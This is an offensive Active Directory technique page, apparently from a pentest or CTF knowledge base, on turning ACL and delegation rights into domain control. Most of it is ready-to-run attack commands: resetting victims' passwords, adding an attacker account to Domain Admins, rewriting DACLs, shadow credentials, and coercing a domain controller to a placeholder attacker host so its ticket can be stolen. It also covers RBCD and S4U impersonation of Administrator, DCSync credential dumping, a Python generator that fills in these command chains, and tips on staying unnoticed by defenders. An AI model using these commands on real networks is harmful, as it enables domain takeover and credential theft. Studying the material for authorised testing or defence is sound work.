---
title: "AD ACL and Delegation Abuse - GenericAll, WriteDACL, RBCD"
category: misc
subcategory: active-directory
type: technique
tags: [acl-abuse, genericall, genericwrite, writedacl, writeowner, rbcd, constrained-delegation, unconstrained-delegation, shadow-credentials, impacket, bloodyad, certipy, getst, active-directory]
difficulty: hard
summary: "Turn a BloodHound ACL/delegation edge into control: reset passwords, add SPNs, rewrite DACLs, and abuse RBCD/constrained/unconstrained delegation to impersonate admins."
when_to_use:
  - "BloodHound shows GenericAll/GenericWrite/WriteDACL/WriteOwner/ForceChangePassword over a target"
  - "A computer or user is trusted for unconstrained or constrained delegation"
  - "You have GenericWrite over a computer and can configure RBCD"
  - "You need to escalate laterally by abusing directory rights rather than a bug"
tools: [impacket, bloodyad, certipy, rubeus, netexec, powerview]
related: [ad-enumeration-bloodhound, ad-credential-attacks, ad-kerberoasting-asreproast, ad-adcs-esc-attacks]
---

## TL;DR

AD delegates control through ACLs. If your principal has an abusable edge over a target, you can
take it over: `GenericAll`/`ForceChangePassword` -> reset its password; `GenericWrite` -> add an SPN
(targeted kerberoast) or shadow credentials; `WriteDACL`/`WriteOwner` -> grant yourself
`GenericAll`. Delegation edges let you impersonate any user to a service.

## Recognise it

- BloodHound edges: `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `Owns`,
  `ForceChangePassword`, `AddMember`, `AllowedToDelegate`, `AllowedToAct`.
- LDAP: `msDS-AllowedToDelegateTo`, `msDS-AllowedToActOnBehalfOfOtherIdentity`, UAC bits
  `TRUSTED_FOR_DELEGATION` (0x80000) / `TRUSTED_TO_AUTH_FOR_DELEGATION` (0x1000000).

## Theory

Every AD object has a DACL saying who may do what to it. Rights like `GenericAll` (full control) are
directly abusable. `WriteDacl`/`WriteOwner` are indirect: you first rewrite the ACL to grant
yourself full control, then abuse that. Delegation lets service accounts act on behalf of users;
misconfigured, it becomes "impersonate the domain admin to CIFS on the DC".

## Attack

### GenericAll / GenericWrite over a USER

```bash
# Reset the target user's password (GenericAll or ForceChangePassword)
net rpc password "victim" "NewP@ss123" -U "corp.local/attacker%AttP@ss" -S 10.10.10.5
# impacket alternative
changepasswd.py corp.local/victim@10.10.10.5 -newpass 'NewP@ss123' -altuser attacker -altpass 'AttP@ss'
# bloodyAD
bloodyAD -u attacker -p 'AttP@ss' -d corp.local --host 10.10.10.5 set password victim 'NewP@ss123'

# OR add an SPN and kerberoast (GenericWrite, no password reset needed -- stealthier)
targetedKerberoast.py -v -d corp.local -u attacker -p 'AttP@ss' --dc-ip 10.10.10.5

# OR shadow credentials (GenericWrite over the user, needs AD CS / PKINIT) -- see below
```

### GenericAll over a GROUP (AddMember)

```bash
# Add yourself to a privileged group
net rpc group addmem "Domain Admins" "attacker" -U "corp.local/attacker%AttP@ss" -S 10.10.10.5
# bloodyAD
bloodyAD -u attacker -p 'AttP@ss' -d corp.local --host 10.10.10.5 add groupMember "Domain Admins" attacker
```

### WriteDACL / WriteOwner -> grant yourself GenericAll

```bash
# WriteOwner: set yourself as owner first
owneredit.py -action write -new-owner attacker -target victim 'corp.local/attacker:AttP@ss' -dc-ip 10.10.10.5

# Then WriteDACL: give yourself full control (or specific rights) with dacledit
dacledit.py -action write -rights FullControl -principal attacker -target victim \
  'corp.local/attacker:AttP@ss' -dc-ip 10.10.10.5

# Now you have GenericAll -> reset password / add SPN as above
```

PowerView equivalents on a Windows foothold:

```powershell
# Grant GenericAll then reset the password
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewP@ss123' -AsPlainText -Force)
```

### Shadow credentials (GenericWrite over user/computer + AD CS)

Write a certificate to the target's `msDS-KeyCredentialLink`, then authenticate via PKINIT.

```bash
# certipy does the whole thing: add a key credential, PKINIT, recover the NT hash
certipy shadow auto -u attacker@corp.local -p 'AttP@ss' -account victim -dc-ip 10.10.10.5

# pywhisker to add the KeyCredentialLink, then PKINIT with gettgtpkinit
pywhisker.py -d corp.local -u attacker -p 'AttP@ss' --target victim --action add
gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass '' corp.local/victim victim.ccache
export KRB5CCNAME=victim.ccache
```

### Unconstrained delegation

A host trusted for unconstrained delegation caches the TGT of anyone who authenticates to it. Coerce
a DC to authenticate, then steal its TGT.

```bash
# On/against the compromised unconstrained host, monitor for incoming TGTs
# Rubeus (Windows): dump TGTs as they arrive
.\Rubeus.exe monitor /interval:5 /nowrap

# Coerce the DC to authenticate to your host (PrinterBug / PetitPotam)
printerbug.py 'corp.local/attacker:AttP@ss'@dc01.corp.local ATTACKER_HOST
# or:
PetitPotam.py -u attacker -p 'AttP@ss' -d corp.local ATTACKER_HOST dc01.corp.local

# Capture the DC's TGT with krbrelayx (Linux)
krbrelayx.py -aesKey <host_aes>    # listens for the coerced auth and extracts the ticket

# Then use the DC's TGT to DCSync
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass -just-dc corp.local/DC01\$@dc01.corp.local
```

### Constrained delegation (S4U)

An account with `msDS-AllowedToDelegateTo` set can impersonate any user to the listed service.

```bash
# Request a service ticket impersonating Administrator to cifs/target (S4U2Self + S4U2Proxy)
getST.py -spn cifs/target.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/svc-web:'SvcP@ss'

# Use the resulting ticket
export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local
```

Protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`) lets S4U2Self work even without the user's
prior Kerberos auth.

### Resource-Based Constrained Delegation (RBCD)

If you have `GenericWrite`/`GenericAll` over a *computer*, write RBCD onto it: create a machine
account you control, set it as allowed-to-act, then S4U to impersonate anyone to that computer.

```bash
# 1. Add a computer account you control (default: any user may add up to MachineAccountQuota=10)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilP@ss123' \
  -dc-ip 10.10.10.5 corp.local/attacker:'AttP@ss'

# 2. Configure RBCD on the target computer to trust EVIL$
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
  -dc-ip 10.10.10.5 corp.local/attacker:'AttP@ss'

# 3. S4U: get a ticket impersonating Administrator to a service on the target
getST.py -spn cifs/target.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 'corp.local/EVIL$:EvilP@ss123'

# 4. Use it
export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local
```

## Code

Given a BloodHound-style edge, print the exact command chain to abuse it -- so you do not have to
remember which tool does which right.

```python
#!/usr/bin/env python3
"""Map an AD ACL/delegation edge to its concrete abuse commands.

Usage:
    python3 acl_abuse.py GenericAll attacker AttP@ss victim corp.local 10.10.10.5
    python3 acl_abuse.py RBCD attacker AttP@ss TARGET$ corp.local 10.10.10.5
"""
from __future__ import annotations

import sys

RECIPES = {
    "genericall": [
        "net rpc password '{tgt}' 'NewP@ss123' -U '{dom}/{u}%{p}' -S {dc}",
        "targetedKerberoast.py -v -d {dom} -u {u} -p '{p}' --dc-ip {dc}",
        "certipy shadow auto -u {u}@{dom} -p '{p}' -account {tgt} -dc-ip {dc}",
    ],
    "genericwrite": [
        "targetedKerberoast.py -v -d {dom} -u {u} -p '{p}' --dc-ip {dc}",
        "certipy shadow auto -u {u}@{dom} -p '{p}' -account {tgt} -dc-ip {dc}",
    ],
    "forcechangepassword": [
        "net rpc password '{tgt}' 'NewP@ss123' -U '{dom}/{u}%{p}' -S {dc}",
    ],
    "writedacl": [
        "dacledit.py -action write -rights FullControl -principal {u} -target {tgt} '{dom}/{u}:{p}' -dc-ip {dc}",
        "# then treat as GenericAll",
    ],
    "writeowner": [
        "owneredit.py -action write -new-owner {u} -target {tgt} '{dom}/{u}:{p}' -dc-ip {dc}",
        "dacledit.py -action write -rights FullControl -principal {u} -target {tgt} '{dom}/{u}:{p}' -dc-ip {dc}",
    ],
    "addmember": [
        "net rpc group addmem '{tgt}' '{u}' -U '{dom}/{u}%{p}' -S {dc}",
    ],
    "rbcd": [
        "addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilP@ss123' -dc-ip {dc} {dom}/{u}:'{p}'",
        "rbcd.py -delegate-from 'EVIL$' -delegate-to '{tgt}' -action write -dc-ip {dc} {dom}/{u}:'{p}'",
        "getST.py -spn cifs/{tgt_host} -impersonate Administrator -dc-ip {dc} '{dom}/EVIL$:EvilP@ss123'",
    ],
}


def main(argv: list[str]) -> int:
    if len(argv) != 7:
        print(__doc__)
        return 1
    edge, u, p, tgt, dom, dc = argv[1:7]
    recipes = RECIPES.get(edge.lower())
    if not recipes:
        print(f"unknown edge '{edge}'. known: {', '.join(RECIPES)}")
        return 1
    tgt_host = tgt.rstrip("$").lower() + "." + dom if tgt.endswith("$") else tgt
    print(f"# Abusing {edge} : {u} -> {tgt}\n")
    for line in recipes:
        print(line.format(u=u, p=p, tgt=tgt, dom=dom, dc=dc, tgt_host=tgt_host))
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Clean up after password resets.** Resetting a real service account's password breaks the service
  and tips off defenders; in CTF it is usually fine, but note the original if you can.
- **Prefer stealthy edges.** Targeted kerberoast (GenericWrite) and shadow credentials avoid changing
  the target's password.
- **MachineAccountQuota.** RBCD needs to add a computer account; if the quota is 0 you must use an
  existing computer you control or another primitive.
- **Shadow credentials need AD CS / PKINIT** available in the domain.
- **Clock skew** breaks every S4U/PKINIT operation -- sync to the DC.
- **ccache naming.** impacket writes tickets to files named after the SPN/user; check the exact
  filename it prints and export `KRB5CCNAME` to it.
- **WriteOwner then WriteDACL** is a two-step: owning the object is not enough, you must also write
  the ACE.

## Tools

- `impacket` -- `getST.py`, `rbcd.py`, `addcomputer.py`, `dacledit.py`, `owneredit.py`,
  `changepasswd.py`, `targetedKerberoast.py`, `printerbug.py`, `secretsdump.py`.
- `bloodyAD` -- password/group/attribute edits.
- `certipy` / `pywhisker` + `gettgtpkinit` -- shadow credentials.
- `Rubeus`, `PowerView` -- Windows-side S4U, monitoring and ACL edits.
- `PetitPotam` / `krbrelayx` -- coercion + unconstrained delegation abuse.

## References

- `[MS-SFU]` (S4U / constrained delegation) and `[MS-ADTS]` (DACLs, UAC bits).
- The BloodHound edge documentation for the exact right each edge represents.
- The impacket example-script help text.
